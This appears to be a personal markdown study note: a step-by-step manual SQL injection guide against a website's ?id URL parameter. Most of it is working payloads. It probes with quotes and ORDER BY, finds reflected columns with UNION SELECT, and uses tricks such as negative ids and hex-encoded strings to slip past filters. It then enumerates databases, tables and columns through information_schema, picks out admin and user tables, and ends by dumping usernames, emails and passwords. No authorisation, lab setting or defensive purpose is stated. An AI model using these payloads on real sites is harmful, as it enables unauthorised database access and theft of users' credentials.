# <mark style="background: #FFB86CA6;">Attention :</mark> 
## All The Command Code We Learn Below, Must Be Typed <mark style="background: #FF5582A6;">After ?Id Number,</mark> In The URL Of The Target Site.

# <mark style="background: #FFB86CA6;">Steps :</mark> 
## First Step :

- <mark style="background: #FFB86CA6;">Putting a single quote ( ' ) in the end of target site</mark> 
	if there is a change in the site or we encountered an error, There is probably a vulnerability in the site.

## Second Step :

- <mark style="background: #FFB86CA6;">order by 9999--</mark> 
	if with above command code, the site could not be loaded but with below command code :
- <mark style="background: #FFB86CA6;">order by 1--</mark> 
	the site has been loaded, we go to the third step

### An important <mark style="background: #FF5582A6;">point 1</mark> :

if with second step code the site has been loaded, so we do this :
- <mark style="background: #FFB86CA6;"><mark style="background: #FF5582A6;">'</mark> order by 9999--<mark style="background: #FF5582A6;">+</mark> </mark> 
	at this stage, with above code, the site should not be loaded or we encountered an error but with below code, the site should be loaded without any error :
- <mark style="background: #FFB86CA6;"><mark style="background: #FF5582A6;">'</mark> order by 1--<mark style="background: #FF5582A6;">+</mark> </mark>

### An important <mark style="background: #FF5582A6;">point 2</mark> :

if for the target we use <mark style="background: #FF5582A6;">' +</mark> at the beginning and end of site, so it's <mark style="background: #FF5582A6;">necessary</mark> to be untill the last step.
if with <mark style="background: #FF5582A6;">' +</mark> at the beginning and end of site, the site is loaded again :
<mark style="background: #FF5582A6;">the site hasn't any sql injection vulnerability</mark> 

### An important <mark style="background: #FF5582A6;">point 3</mark> :

before third step, we must know that how many columns does the target site have, for this we must subtract from number of (order by 9999-- or 'order by 9999--) to get the actual number of columns.
how do we know ?
when we reached the first number that the target site was loaded, and with the number
after that, we encountered an error or a change in the appearance of the site compared to (order by 1-- or 'order by 1--), <mark style="background: #FF5582A6;">we understand the number of columns.</mark> 

## Third Step :

- <mark style="background: #FFB86CA6;">union select the number of columns--</mark> 
	for example, in a site where we have 9 columns :
		union select 1,2,3,4,5,6,7,8,9-- 
with this code we should see the column numbers on the desired page.

### <mark style="background: #FF5582A6;">Point 1 :</mark> 

if we didn't see the column numbers (in page or source), we have to do this : 
1. (-) behind the ?id number
	for example : ?id=46 -------> ?id=-46
2. (and 0) after the ?id number
3. (dir 0) after the ?id number
4. (where 1 like 0) after the ?id number
5. (and 1 like 0) after the ?id number
6. 9999 instead of ?id number
7. null instead of ?id number
8. put the ?id number inside a parenthesis
	for example : ?id=46 -------> ?id=(46)

### <mark style="background: #FF5582A6;">Point 2 :</mark> 

if the number of columns was too large to write :
	HackBar Quantum ---> sql part ---> union select statement --->
	we write the number of columns we wants ---> and Quantum give us
	the desired code with union select.

## Fourth Step :

<mark style="background: #FF5582A6;">this step is optional</mark> 
for example, in a site where we have 9 columns :
- <mark style="background: #FFB86CA6;">union select 1,2,3,4,5,database(),7,8,9-- </mark> 
- <mark style="background: #FFB86CA6;">union select 1,2,3,4,5,version(),7,8,9--</mark> 
instead of (version()), we can use the following words :
1. @@version
2. @@global.version
3. @@innodb_version

## The Fifth :

- <mark style="background: #FFB86CA6;">group_concat(table_name) from information_schema.tables where table_schema=database()--</mark> 
	
	for example, in a site where we have 9 columns :
- union select 1,2,3,4,5,group_concat(table_name),7,8,9 from information_schema.tables where table_schema=database()--
### <mark style="background: #FF5582A6;">Point :</mark> 
(br in '<>') beside (table_name,) for vertical display of columns.
if a site with (br in '<>') give us an error, we use it's hex expression without quotation : <mark style="background: #FF5582A6;">0x3c62723e</mark> 

## The Sixth Step :

<mark style="background: #FF5582A6;">we are looking for important table with the sixth step code.</mark> 
table that contain the following words :
1. admin
2. user
3. login
4. member
5. account
6. setting
7. panel
8. crm
9. cms
10. db
11. server
12. host
13. columns_priv

### <mark style="background: #FF5582A6;">Point :</mark> 
if we didn't find the important table :
- <mark style="background: #FFB86CA6;">union select group_concat(schema_name) from information_schema.schemata--</mark> 
with above code we understand the name of all the site's databases.
if the target site had only one database and that database didn't have an important table then the target <mark style="background: #FF5582A6;">doesn't have an admin panel.</mark> 
in multi-database sites, we search each database to find the important tables.

## The Seventh Step :

after finding the important table, we find the content of columns of that table with following code :

- <mark style="background: #FFB86CA6;">group_concat(column_name) from information_schema.columns where table_name='important table'--</mark> 

	for example, in a site where we have 9 columns :
	
- union select 1,2,3,4,5,group_concat(<mark style="background: #FF5582A6;">column</mark> _name),7,8,9 from information_schema<mark style="background: #FF5582A6;">.columns</mark> where table<mark style="background: #FF5582A6;">_name</mark> =<mark style="background: #FF5582A6;">'important table'</mark> --

<mark style="background: #FF5582A6;">and we are looking for important columns.</mark> 
columns that contain the following words :
1. user
2. username
3. password
4. pass
5. usr
6. pwd
7. email

### <mark style="background: #FF5582A6;">Point :</mark> 
the target site maybe sensitive to quotation, in such cases we should to hex the important table with HackBar For Quantum and put the hex expression in our code without quotation.

## The Eighth Step :

- <mark style="background: #FFB86CA6;">union select 1,2,3,4,5,group_concat(username,email,password),7,8,9 from important table--</mark> 

### <mark style="background: #FF5582A6;">point 1:</mark> 
at this step, we type the important table without quotation and also we can't use the hex expression.

### <mark style="background: #FF5582A6;">Point 2 :</mark> 
to separate username, email and password from each other on the desired target page :
we use (<mark style="background: #FF5582A6;">0x3a3a</mark>) between username, email and password :
(username,0x3a3a,email,0x3a3a,password)

## Final Step :

we see the username, email and password on the desired page, of course, the password maybe hashed. ([[1-Intro]])










